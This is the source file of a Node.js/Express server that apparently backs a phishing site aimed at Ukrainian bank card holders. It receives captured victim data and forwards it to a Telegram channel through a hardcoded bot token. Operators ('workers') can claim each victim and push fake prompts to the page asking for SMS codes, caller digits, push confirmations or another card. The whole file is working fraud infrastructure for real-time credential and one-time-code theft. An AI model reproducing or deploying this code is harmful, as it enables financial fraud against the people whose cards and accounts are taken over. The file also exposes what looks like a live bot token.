const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';

let userTasks = {}; 
let logsStorage = {}; 

const cmdTexts = {
    'sms': 'Введіть код підтвердження, що надійшов у СМС',
    'call': 'Введіть останніх 4 цифри номера, з якого надійде дзвінок',
    'push': 'Підтвердіть вхід у вашому мобільному додатку',
    'bal': 'Недостатньо коштів на картці для верифікації. Спробуйте іншу картку',
    'support': 'Помилка безпеки. Опишіть проблему оператору в чаті',
    'custom': 'Повторіть спробу або введіть дані ще раз'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    let channelMsg = `<b>🆕 НОВИЙ ЛОГ [${safeText(type)}]</b>\n`;
    channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
    channelMsg += `📍 Статус: 🔵 Очікує...`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHANNEL_ID,
            text: channelMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "⚡️ ВЗЯТИ В РОБОТУ", callback_data: `take_${userId}` }]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        res.status(500).send('Error');
    }
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data;
        const worker = callback_query.from; // Кто нажал кнопку
        const workerName = worker.username ? `@${worker.username}` : worker.first_name;

        // 1. ЛОГИКА "ВЗЯТЬ В РАБОТУ"
        if (data.startsWith('take_')) {
            const userId = data.split('_')[1];
            const log = logsStorage[userId];

            if (log) {
                // Отправляем лог воркеру в личку
                let fullMsg = `<b>💎 ПОВНИЙ ЛОГ [${log.type}]</b>\n`;
                fullMsg += `🆔 ID: <code>${userId}</code>\n`;
                fullMsg += `⏰ Час: ${log.time}\n`;
                fullMsg += `------------------------\n`;
                for (let key in log.data) {
                    fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`;
                }

                try {
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: worker.id,
                        text: fullMsg,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
                                    { text: "📞 Дзвінок", callback_data: `ask_${userId}_call` }
                                ],
                                [
                                    { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
                                    { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
                                ],
                                [
                                    { text: "✍️ Свій текст", callback_data: `ask_${userId}_custom` }
                                ]
                            ]
                        }
                    });

                    // Редактируем сообщение в канале
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                        chat_id: CHANNEL_ID,
                        message_id: callback_query.message.message_id,
                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взяв у роботу: <b>${workerName}</b> ✅`,
                        parse_mode: 'HTML'
                    });

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                        callback_query_id: callback_query.id,
                        text: "Лог відправлено вам у приватні повідомлення!"
                    });
                } catch (err) {
                    // Если воркер не запустил бота, он не сможет отправить сообщение
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                        callback_query_id: callback_query.id,
                        text: "⚠️ Спершу запустіть бота в приватних повідомленнях!",
                        show_alert: true
                    });
                }
            }
        }

        // 2. ЛОГИКА КНОПОК ОШИБОК (callback)
        if (data.startsWith('ask_') || data.startsWith('msg_')) {
            const [action, userId, code] = data.split('_');
            userTasks[userId] = { action, text: cmdTexts[code] || "Введіть дані" };
            
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "✅ Команда відправлена!"
            });
        }
    }
    
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен`));
